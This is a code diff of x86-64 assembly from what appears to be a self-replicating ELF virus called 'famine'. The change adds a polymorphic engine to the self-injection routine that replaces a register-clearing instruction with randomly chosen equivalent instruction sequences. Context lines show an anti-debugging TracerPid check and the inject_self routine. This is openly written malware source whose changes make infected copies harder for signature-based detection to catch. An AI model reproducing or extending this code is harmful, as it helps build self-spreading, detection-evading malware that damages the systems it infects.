@@ -124,7 +124,11 @@ cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 
 
 ;compute commfile path
+.poly_xor_r10_1:
 xor r10, r10
+nop
+nop
+nop
 
 .dirname_proc:
 	lea rsi, STACK(famine.commpath)
@@ -635,13 +639,13 @@ inject_self:
 	mov r11, POLY_NOP_NUMBER	; the number of possible polymorphic intrustions 
 	mov rax, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
 	lea rsi, [rel poly_nop]
-	call .poly_nop
-	jmp .poly_nop2
+	call .poly_engine
+	jmp .poly_xor1
 
 	;HERE IT REPLACE 4 BYTE NOP AT POLY_NOP_1_OFFSET WITH 4 BYTE IDENTICAL AS NOP ; 
 
 	;THE FUNCTION NEED : r10 AT THE OFFSET TO REPLACE DATA  - r11 REPRESENT NUMBER OF POSSIBLE POLY INTRSUCTIONS - rax HAS TO BE EQUAL TO THE SIZE TO REPLACE - RSI = lea rsi, [rel LOCATION OF POLY INTRUCTIONS]
-	.poly_nop:
+	.poly_engine:
 	call _start.get_random
 	xor rdi,rdi
 	mov dil, byte STACK(famine.tmp_rand)
@@ -659,9 +663,13 @@ inject_self:
 	mov dword[r10], r11d
 	ret
 	;END OF POLY 4byte NOPS
-	.poly_nop2:
+	.poly_xor1:
 	lea r10, STACK(famine.tocypher)
-	add r10, POLY_NOP_1_OFFSET
+	add r10, POLY_XOR_R10_1_OFFSET
+	mov r11, POLY_XOR_NUMBER
+	mov rax, POLY_XOR_SIZE
+	lea rsi, [rel poly_xor_r10_r10]
+	call .poly_engine
 	;setting r10 to REAL_POLY_2_OFFSET + location in mem
 
 
@@ -823,6 +831,30 @@ poly_nop:	add r10, 0
 				db 0x90
 
 
+poly_xor_r10_r10:	push 0
+						pop r10
+						push rax
+						pop rax
+
+					and r10, 0
+						push rbx
+						pop rbx
+
+					sub r10, r10
+						mov rax, rax
+
+					xor r10, r10
+						mov rbp, rbp
+
+					xor r10, r10
+						mov rbx, rbx
+
+					sub r10, r10
+						mov rcx, rcx
+
+					mov r10d, 0
+
+					lea eax, [rel 0]
 
 
 
